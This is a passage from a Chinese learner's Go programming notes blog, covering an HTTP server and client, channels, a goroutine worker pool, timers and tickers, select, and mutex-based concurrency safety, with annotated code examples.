class="hljs-comment">在 myHandler 函数中，w 用于构建响应并发送给客户端。</span><br><span class="hljs-comment">r *http.Request 是一个表示 HTTP 请求的结构体。它包含了关于客户端请求的信息，如请求方法、URL、请求头、请求体等。</span><br><span class="hljs-comment">在 myHandler 函数中，r 用于访问客户端的请求信息，以便根据请求执行相应的操作。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//简单来说w是服务端对客户端进行的操作,而r是客户端发来的请求对象,以下是对r的操作</span><br>fmt.Println(r.RemoteAddr, <span class="hljs-string">&quot;:连接成功&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;method:&quot;</span>, r.Method)<br>fmt.Println(<span class="hljs-string">&quot;url:&quot;</span>, r.URL.Path)<br>fmt.Println(<span class="hljs-string">&quot;header:&quot;</span>, r.Header)<br>fmt.Println(<span class="hljs-string">&quot;body:&quot;</span>, r.Body)<br><span class="hljs-comment">//这里的w是服务端对客户端的操作</span><br>w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;这是服务器发来的消息&quot;</span>))<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>resp, err := http.Get(<span class="hljs-string">&quot;http://127.0.0.1:1234/index&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>fmt.Println(resp.Status)<br>fmt.Println(resp.Header)<br>buf := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">1024</span>)<br><span class="hljs-keyword">for</span> &#123;<br>n, err := resp.Body.Read(buf)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &amp;&amp; err != io.EOF &#123;<br>log.Fatalln(err)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;读取完成&quot;</span>)<br>fmt.Println(<span class="hljs-type">string</span>(buf[:n]))<br><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="websocket编程-聊天室"><a href="#websocket编程-聊天室" class="headerlink" title="websocket编程(聊天室)"></a>websocket编程(聊天室)</h2><p><a href="https://github.com/taosu0216/go_stu/tree/main/Internet_coding/web_socket">https://github.com/taosu0216/go_stu/tree/main/Internet_coding/web_socket</a><br>基本完成,代码都能看懂但是纯自己写应该是写不出来,前端代码没看,项目不完整(不能ip:端口&#x2F;路径来访问,等着再学学再说吧)</p><h1 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(i <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br>fmt.Println(<span class="hljs-string">&quot;Goroutine &quot;</span>, i, <span class="hljs-string">&quot; 号开始执行&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">10</span>; i++ &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> hello(i)<br><span class="hljs-keyword">go</span> hello(i + <span class="hljs-number">10</span>)<br>&#125;<br>wg.Wait()<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><p>通道可以关闭,但关闭通道不是必须的<br>ch:&#x3D;make(chan []int,65535)<br>此时的ch就是一个用于接收数值数组的,后面的数字代表通道最大容量,可以不加<br>close(ch)<br>这是关闭通道的操作,关闭通道可以再从channel中读取,但是不能再存入了</p><p>channel分为有缓冲和无缓冲<br>无缓冲就是在创建channel时不加数字,此时相当于一个单纯的消息通道作用,有传入就必须有接收,否则会发生恐慌<br>无缓冲通道又叫同步通道<br>有缓冲就是有数字,此时channel类似快递站,可以暂存消息,有信息传入channel后,可以不用立刻有接收方</p><h3 id="判断channel是否关闭"><a href="#判断channel是否关闭" class="headerlink" title="判断channel是否关闭"></a>判断channel是否关闭</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ch1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">20</span>)<br>ch2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">20</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">10</span>; i++ &#123;<br>ch1 &lt;- i<br>&#125;<br><span class="hljs-built_in">close</span>(ch1)<br>&#125;()<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">//第一种判断channel是否关闭的方法,如果channel关闭则ok为false</span><br>i, ok := &lt;-ch1<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>ch2 &lt;- i * i<br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(ch2)<br>&#125;()<br><span class="hljs-comment">//第二种判断channel是否关闭的方法,如果关闭则会自动退出range循环</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> ch2 &#123;<br>fmt.Println(i)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="worker-pool-Goroutine池"><a href="#worker-pool-Goroutine池" class="headerlink" title="worker pool(Goroutine池)"></a>worker pool(Goroutine池)</h3><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20231008084330.png"><br>计算一个数字的各个位数之和，例如数字123，结果为1+2+3&#x3D;6<br>随机生成数字进行计算</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math/rand&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Result <span class="hljs-keyword">struct</span> &#123;<br>job *Job<br>sum <span class="hljs-type">int</span><br>&#125;<br><span class="hljs-keyword">type</span> Job <span class="hljs-keyword">struct</span> &#123;<br>Id            <span class="hljs-type">int</span><br>Random_number <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//先建立需要的channel,分别是将job传给工人的channel和结果的channel</span><br>send_channel := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *Job, <span class="hljs-number">128</span>)<br>result_channel := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *Result, <span class="hljs-number">128</span>)<br><span class="hljs-comment">//将channel传入工人池,第一个64是job的数量</span><br>worker_pool(<span class="hljs-number">64</span>, send_channel, result_channel)<br><span class="hljs-comment">//接收结果并打印</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(result_c <span class="hljs-keyword">chan</span> *Result)</span></span> &#123;<br><span class="hljs-keyword">for</span> result := <span class="hljs-keyword">range</span> result_c &#123;<br>fmt.Println(<span class="hljs-string">&quot;第&quot;</span>, result.job.Id+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;个job,它的随机值是:&quot;</span>, result.job.Random_number, <span class="hljs-string">&quot;是它的结果是:&quot;</span>, result.sum)<br>&#125;<br>&#125;(result_channel)<br><span class="hljs-comment">//defer关闭channel</span><br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(send_channel)<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(result_channel)<br><span class="hljs-comment">//建立将job传入channel的函数(正常来说这一步应该是放在前面,但是文档这里是无限循环,所以放在最后,我这里改成有限循环了,注意这里循环值也就是循环次数,i的最大值要大一些,否则程序可能没来得及打印就推出了)</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++ &#123;<br>rand_num := rand.Int()<br>job := &amp;Job&#123;<br>Id:            i,<br>Random_number: rand_num,<br>&#125;<br>send_channel &lt;- job<br>&#125;<br><span class="hljs-comment">// time.Sleep(2 * time.Second)</span><br>&#125;<br><br><span class="hljs-comment">// 创建工人池</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker_pool</span><span class="hljs-params">(num <span class="hljs-type">int</span>, sc <span class="hljs-keyword">chan</span> *Job, rc <span class="hljs-keyword">chan</span> *Result)</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; num; i++ &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(sc <span class="hljs-keyword">chan</span> *Job, rc <span class="hljs-keyword">chan</span> *Result)</span></span> &#123;<br><span class="hljs-keyword">for</span> job := <span class="hljs-keyword">range</span> sc &#123;<br><span class="hljs-comment">//获取随机数并进行处理</span><br>r_num := job.Random_number<br><span class="hljs-comment">//sum就是求和的结果,要把sum传进Result结构体,并将Result传入rc通道</span><br>sum := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> r_num != <span class="hljs-number">0</span> &#123;<br>tmp := r_num % <span class="hljs-number">10</span><br>sum += tmp<br>r_num = r_num / <span class="hljs-number">10</span><br>&#125;<br>re := &amp;Result&#123;<br>job: job,<br>sum: sum,<br>&#125;<br>rc &lt;- re<br>&#125;<br>&#125;(sc, rc)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><h3 id="timer"><a href="#timer" class="headerlink" title="timer"></a>timer</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Timer <span class="hljs-keyword">struct</span>&#123;<br>C &lt;- <span class="hljs-keyword">chan</span> Time<br>&#125;<br><span class="hljs-keyword">type</span> Time <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// 内含隐藏或非导出字段</span><br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Time代表一个纳秒精度的时间点。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">程序中应使用Time类型值来保存和传递时间，而不能用指针。就是说，表示时间的变量和字段，应为time.Time类型，而不是*time.Time.类型。</span><br><span class="hljs-comment">一个Time类型值可以被多个go程同时使用。时间点可以使用Before、After和Equal方法进行比较。</span><br><span class="hljs-comment">Sub方法让两个时间点相减，生成一个Duration类型值（代表时间段）。</span><br><span class="hljs-comment">dd方法给一个时间点加上一个时间段，生成一个新的Time类型时间点。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Time零值代表时间点January 1, year 1, 00:00:00.000000000 UTC。因为本时间点一般不会出现在使用中，IsZero方法提供了检验时间是否显式初始化的一个简单途径。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">每一个时间都具有一个地点信息（及对应地点的时区信息），当计算时间的表示格式时，如Format、Hour和Year等方法，都会考虑该信息。Local、UTC和In方法返回一个指定时区（但指向同一时间点）的Time。修改地点/时区信息只是会改变其表示；不会修改被表示的时间点，因此也不会影响其计算。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Now</span><span class="hljs-params">()</span></span> Time<br><span class="hljs-comment">//Now返回当前本地时间。</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewTimer</span><span class="hljs-params">(d Duration)</span></span> *Timer<br><span class="hljs-comment">//NewTimer创建一个Timer，它会在最少过去时间段d后到期，向其自身的C字段发送当时的时间。</span><br><span class="hljs-comment">//上面这两个函数加起来就是计时器</span><br></code></pre></td></tr></table></figure><p>正式程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(time.Now())<br><span class="hljs-comment">//写入数据是 channel &lt;- data</span><br><span class="hljs-comment">//读取数据时 data &lt;- channel</span><br>t := &lt;- time.NewTimer(time.Second).C<br>fmt.Printf(<span class="hljs-string">&quot;%v&quot;</span>, t)<br><br>timer2 := time.NewTimer(time.Second)<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">//这是 Go 语言的一个特性,我们可以直接从通道接收数据,而不需要指定接收变量。这种方式我们称为&quot;丢弃接收&quot;。</span><br>&lt;-timer2.C<br>fmt.Println(<span class="hljs-string">&quot;时间到&quot;</span>)<br>&#125;<br><br>fmt.Println(time.Now())<br>t1 := time.NewTimer(<span class="hljs-number">2</span> * time.Second)<br>&lt;-t1.C<br>fmt.Println(<span class="hljs-string">&quot;过去了2秒&quot;</span>)<br><br>t := time.NewTimer(time.Second)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>&lt;-t.C<br>fmt.Println(<span class="hljs-string">&quot;收到时间&quot;</span>)<br>&#125;()<br><span class="hljs-comment">//只有在这里睡2秒钟(及以上)才可以打印&quot;收到时间&quot;,否则都是已关闭</span><br>time.Sleep(<span class="hljs-number">2</span> * time.Second)<br><span class="hljs-keyword">for</span> t.Stop() &#123;<br>fmt.Println(<span class="hljs-string">&quot;已关闭&quot;</span>)<br>&#125;<br><span class="hljs-comment">// 5.重置定时器</span><br>timer5 := time.NewTimer(<span class="hljs-number">3</span> * time.Second)<br>timer5.Reset(<span class="hljs-number">1</span> * time.Second)<br>fmt.Println(time.Now())<br>fmt.Println(&lt;-timer5.C)<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="ticker"><a href="#ticker" class="headerlink" title="ticker"></a>ticker</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 1.获取ticker对象</span><br>ticker := time.NewTicker(<span class="hljs-number">1</span> * time.Second)<br>i := <span class="hljs-number">0</span><br><span class="hljs-comment">// 子协程</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">//&lt;-ticker.C</span><br>i++<br><span class="hljs-comment">//这个语法也是合理的</span><br>fmt.Println(&lt;-ticker.C)<br><span class="hljs-keyword">if</span> i == <span class="hljs-number">5</span> &#123;<br><span class="hljs-comment">//停止</span><br>ticker.Stop()<br>&#125;<br>&#125;<br>&#125;()<br><span class="hljs-keyword">for</span> &#123;<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>timer和ticker的区别<br>Ticker在Go语言中是专门用来实现定期任务的一个结构体。它的英文意思是“计时器”。<br>具体来说:<br>Ticker代表一个计时器,可以定期生成时间脉冲。<br>它通过时间通道(channel)定期地发送当前时间。<br>不同于Timer是一次性的,Ticker是自动重复工作的。</p><p>使用Ticker的主要场景包括:<br>需要每隔一定时间就执行一次的重复任务,比如每隔1秒打印一次日志。<br>需要基于时间来驱动和同步其他goroutine工作,例如心跳检测。<br>需要周期性执行某些操作而不是手动定时,如每10分钟保存一次数据。</p><p>Ticker的工作流程:<br>使用time.NewTicker创建一个Ticker对象<br>它会打开一个时间通道<br>从该通道中周期性读取时间信号<br>根据时间信号驱动后续任务执行<br>可以调用Stop停止Ticker工作</p><h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>_,ok :&#x3D; &lt;- channel<br>占位符代表的是从channel中拿取的数据,ok(bool)是判断是否有数据,如果ok为false则说明通道内无数据或者通道关闭</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-chan1:<br>   <span class="hljs-comment">// 如果chan1成功读到数据，则进行该case处理语句</span><br><span class="hljs-keyword">case</span> chan2 &lt;- <span class="hljs-number">1</span>:<br>   <span class="hljs-comment">// 如果成功向chan2写入数据，则进行该case处理语句</span><br><span class="hljs-keyword">default</span>:<br>   <span class="hljs-comment">// 如果上面都没有成功，则进入default处理流程</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果多个通道同时就绪,则只选择一个随机执行,剩下的数据都被丢弃,所以写的时候要注意好逻辑,否则可能会丢失数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-comment">// 创建2个管道</span><br>   int_chan := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br>   string_chan := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">1</span>)<br>   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      <span class="hljs-comment">//time.Sleep(2 * time.Second)</span><br>      int_chan &lt;- <span class="hljs-number">1</span><br>   &#125;()<br>   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      string_chan &lt;- <span class="hljs-string">&quot;hello&quot;</span><br>   &#125;()<br>   <span class="hljs-keyword">select</span> &#123;<br>   <span class="hljs-keyword">case</span> value := &lt;-int_chan:<br>      fmt.Println(<span class="hljs-string">&quot;int:&quot;</span>, value)<br>   <span class="hljs-keyword">case</span> value := &lt;-string_chan:<br>      fmt.Println(<span class="hljs-string">&quot;string:&quot;</span>, value)<br>   &#125;<br>   fmt.Println(<span class="hljs-string">&quot;main结束&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sync"><a href="#sync" class="headerlink" title="sync"></a>sync</h2><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20231008191355.png"><br>讲的很清晰明了了,就是var wg sync.WaitGroup的时候要定义成全局变量<br>sync.Once和sync.Map暂时好像还用不到,先过</p><h2 id="并发安全和锁"><a href="#并发安全和锁" class="headerlink" title="并发安全和锁"></a>并发安全和锁</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//上面的代码中我们开启了两个goroutine去累加变量x的值，这两个goroutine在访问和修改x变量的时候就会存在数据竞争，导致最后的结果与期待的不符。</span><br><span class="hljs-keyword">var</span> x <span class="hljs-type">int64</span><br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5000</span>; i++ &#123;<br>        x = x + <span class="hljs-number">1</span><br>    &#125;<br>    wg.Done()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    wg.Add(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">go</span> add()<br>    <span class="hljs-keyword">go</span> add()<br>    wg.Wait()<br>    fmt.Println(x)<br>&#125;<br></code></pre></td></tr></table></figure><p>Mutex,  mutual exclusion,即互斥锁的英文</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> x <span class="hljs-type">int64</span><br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br><span class="hljs-keyword">var</span> lock sync.Mutex<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">200</span>; i++ &#123;<br>lock.Lock()<br>x += <span class="hljs-number">1</span><br>lock.Unlock()<br>&#125;<br>wg.Done()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(time.Now())<br>wg.Add(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">go</span> add()<br><span 